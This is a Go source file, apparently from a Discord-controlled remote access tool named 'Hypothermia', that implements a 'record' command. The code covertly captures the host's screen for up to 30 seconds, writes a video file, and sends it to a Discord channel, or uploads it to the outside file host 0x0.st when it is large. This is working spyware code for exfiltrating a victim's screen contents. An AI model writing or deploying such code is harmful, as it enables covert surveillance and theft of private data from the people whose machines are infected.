package commands

import (
	"fmt"
	"image/jpeg"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
	"github.com/icza/mjpeg"
	"github.com/vova616/screenshot"
)

const (
	recUsage string = "[seconds]"

	recArgsError   string = "🟥 Expected 1 argument."
	recConvError   string = "🟥 Failed to convert argument."
	recFileError   string = "🟥 Failed to create file."
	recTestSSError string = "🟥 Failed to take test screenshot."
	recWriterError string = "🟥 Failed to create video writer."
	recCloseError  string = "🟥 Failed to close video writer."
	recSizeError   string = "🟥 File is empty or does not exist."
	recOpenError   string = "🟥 Failed to open file."
	recUploadError string = "🟥 Failed to upload file."

	recStart    string = "🟩 Recording for %d seconds."
	recDone     string = "🟩 Recording completed, sending file..."
	recTooLong  string = "🟨 Recording time is too long, recording for 30 seconds."
	recTooLarge string = "🟨 Recording is over 8MB, uploading to 0x0.st..."

	recUploadSuccess string = "🟩 Uploaded at: %s"

	sizeLimit int64 = 8 * 1024 * 1024
	fps       int   = 30
)

func (*RecordCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, recArgsError, recUsage), m.Reference())
		return
	}

	dur, err := strconv.Atoi(args[0])
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, recConvError, m.Reference())
		return
	}

	if dur > 30 {
		dur = 30
		s.ChannelMessageSendReply(m.ChannelID, recTooLong, m.Reference())
	}

	msg, _ := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(recStart, dur), m.Reference())

	img, err := screenshot.CaptureScreen()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, recTestSSError, m.Reference())
		return
	}

	width := img.Bounds().Dx()
	height := img.Bounds().Dy()

	fileName := filepath.Join(os.TempDir(), time.Now().Format("20060102_150405")+".avi")

	writer, err := mjpeg.New(fileName, int32(width), int32(height), int32(fps))
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, recWriterError, m.Reference())
		return
	}

	frames := dur * fps
	for range frames {
		img, err := screenshot.CaptureScreen()
		if err != nil {
			continue
		}

		tempSS, err := os.CreateTemp("", "ss*.jpg")
		if err != nil {
			continue
		}

		tempName := tempSS.Name()

		err = jpeg.Encode(tempSS, img, &jpeg.Options{Quality: 60})
		tempSS.Close()

		if err != nil {
			os.Remove(tempName)
			continue
		}

		jpeg, err := os.ReadFile(tempName)
		os.Remove(tempName)
		if err != nil {
			continue
		}

		err = writer.AddFrame(jpeg)
		if err != nil {
			continue
		}

		time.Sleep(time.Second / time.Duration(fps))
	}

	err = writer.Close()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, recCloseError, m.Reference())
		return
	}

	s.ChannelMessageEdit(msg.ChannelID, msg.ID, recDone)

	fileInfo, err := os.Stat(fileName)
	if err != nil || fileInfo.Size() == 0 {
		s.ChannelMessageSendReply(m.ChannelID, recSizeError, m.Reference())
		return
	}

	file, err := os.Open(fileName)
	if err != nil {
		os.Remove(fileName)
		s.ChannelMessageSendReply(m.ChannelID, recOpenError, m.Reference())
		return
	}

	defer file.Close()

	fileSize := fileInfo.Size()
	if fileSize > sizeLimit {
		msg, err := s.ChannelMessageSendReply(m.ChannelID, recTooLarge, m.Reference())
		if err != nil {
			os.Remove(fileName)
			return
		}

		url, err := utils.UploadFile(fileName, file)
		if err != nil {
			os.Remove(fileName)
			s.ChannelMessageSendReply(m.ChannelID, recUploadError, m.Reference())
			return
		}

		s.ChannelMessageEdit(msg.ChannelID, msg.ID, fmt.Sprintf(recUploadSuccess, url))
		return
	} else {
		_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Reference: m.Reference(),
			Files: []*discordgo.File{{
				Name:   filepath.Base(fileName),
				Reader: file,
			}},
		})

		if err != nil {
			os.Remove(fileName)
			return
		}
	}

	os.Remove(fileName)
}

func (*RecordCommand) Name() string {
	return "record"
}

func (*RecordCommand) Info() string {
	return "records the user's screen for a set amount of time"
}

type RecordCommand struct{}
